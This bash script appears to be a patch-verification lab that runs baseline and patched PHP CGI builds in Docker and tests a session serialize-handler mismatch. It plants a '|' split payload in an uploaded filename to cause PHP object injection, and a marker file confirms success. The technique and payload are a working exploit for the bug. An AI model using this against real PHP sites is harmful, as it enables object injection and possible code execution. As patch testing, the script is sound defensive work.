#!/usr/bin/env bash
# Chain C A/B: per-directory .user.ini session handler mismatch.
#
# Needs the CGI SAPI (php-cgi behind Apache): .user.ini is only honoured by
# CGI/FastCGI -- mod_php uses .htaccess and the CLI server ignores both.
#
# The writer handler depends on the branch:
#   5.4        -> php_binary   (php_serialize was added in 5.5.4)
#   5.5+       -> php_serialize (the chain as originally described)
# The reader is always `php`. Either way the reader splits at '|', so a '|'
# planted in the uploaded filename becomes the split point and the tail is
# unserialized. Patch 003 encodes '|', so the primitive is gone.
#
# The proof is computed: the injected object's __destruct writes a marker, and
# the marker only appears if the reader really split at '|' and unserialized.
#
# Usage: run.sh [branch]        (default 5.4)
set -euo pipefail
cd "$(dirname "$0")"

BRANCH="${1:-${BRANCH:-5.4}}"
case "$BRANCH" in
  5.4) WRITER=php_binary ;;
  5.5|5.6|7.0|7.1|7.2|7.3|7.4|8.1) WRITER=php_serialize ;;
  *) echo "unknown branch: $BRANCH" >&2; exit 2 ;;
esac
READER=php

PATCHED_IMAGE="${PATCHED_IMAGE:-es-php:${BRANCH}-cgi}"
BASELINE_IMAGE="${BASELINE_IMAGE:-es-php:${BRANCH}-cgi-baseline}"
PORT="${CGI_PORT:-8058}"
NAME=chainc-lab
SID=mismatchprobe0000000000000
PAYLOAD='x|O:13:\"MismatchProbe\":0:{}'

for image in "$PATCHED_IMAGE" "$BASELINE_IMAGE"; do
  docker image inspect "$image" >/dev/null 2>&1 || {
    echo "missing image: $image" >&2
    echo "  docker build -f containers/php-5/Dockerfile.cgi -t $image \\" >&2
    echo "    --build-arg BRANCH=${BRANCH} --build-arg VERSION=<ver> \\" >&2
    echo "    --build-arg SHA256=\$(python3 -c \"import json;print(json.load(open('sources.lock.json'))['branches']['${BRANCH}']['sha256'])\") ." >&2
    echo "  (add --build-arg SKIP_PATCHES=1 for the baseline image)" >&2
    exit 2
  }
done

# .user.ini must be written per run because the writer handler varies by branch;
# the shipped web/ tree carries a 5.4 default.
WEBROOT="$(mktemp -d)"
trap 'rm -rf "$WEBROOT"; docker rm -f "$NAME" >/dev/null 2>&1 || true' EXIT
cp -r web/. "$WEBROOT/"
# mktemp -d is 0700; Apache serves as www-data and must be able to traverse it.
chmod -R a+rX "$WEBROOT"
printf 'session.serialize_handler = %s\n' "$WRITER" > "$WEBROOT/app/.user.ini"
printf 'session.serialize_handler = %s\n' "$READER" > "$WEBROOT/api/.user.ini"

run_case() {
  local label="$1" image="$2"
  docker rm -f "$NAME" >/dev/null 2>&1 || true
  docker run -d --name "$NAME" --user 0:0 -v "$WEBROOT:/web:ro" \
    --tmpfs /data:rw,noexec,nosuid,size=16m,mode=1777 \
    --memory 256m -p "127.0.0.1:${PORT}:8080" "$image" >/dev/null
  for _ in $(seq 1 60); do
    curl -fsS --max-time 2 "http://127.0.0.1:${PORT}/app/index.php" >/dev/null 2>&1 && break
    sleep 0.5
  done

  echo "=== $label ($image)"
  echo "    writer handler : $(curl -s --max-time 10 "http://127.0.0.1:${PORT}/app/index.php" | grep -o 'handler=.*')"
  echo "    reader handler : $(curl -s --max-time 10 "http://127.0.0.1:${PORT}/api/index.php" | grep -o 'handler=.*')"

  # Writer only, so we can show exactly what landed in the session file.
  python3 - "$SID" "$PAYLOAD" "$PORT" <<'PY' >/dev/null
import sys
sys.path.insert(0, '.')
from probe import post
post("127.0.0.1", int(sys.argv[3]), "/app/index.php", sys.argv[1], sys.argv[2])
PY
  echo "    stored name    : $(docker exec "$NAME" sh -c "cat -v /data/sessions/sess_${SID}" | grep -o 's:4:\"name\";s:[0-9]*:\"[^\"]*\"' | head -1)"
  echo "    '|' in session : $(docker exec "$NAME" sh -c "cat /data/sessions/sess_${SID}" | grep -c '|')"

  python3 probe.py "http://127.0.0.1:${PORT}" "$SID" "$PAYLOAD" | sed 's/^/    /'
  if docker exec "$NAME" sh -c '[ -f /data/injected ]' 2>/dev/null; then
    echo "    MARKER         : $(docker exec "$NAME" cat /data/injected) -> OBJECT INJECTION CONFIRMED"
  else
    echo "    MARKER         : absent -> no injection"
  fi
  docker rm -f "$NAME" >/dev/null 2>&1 || true
}

echo "branch $BRANCH: writer=$WRITER reader=$READER"
run_case "BASELINE unpatched" "$BASELINE_IMAGE"
echo
run_case "PATCHED" "$PATCHED_IMAGE"
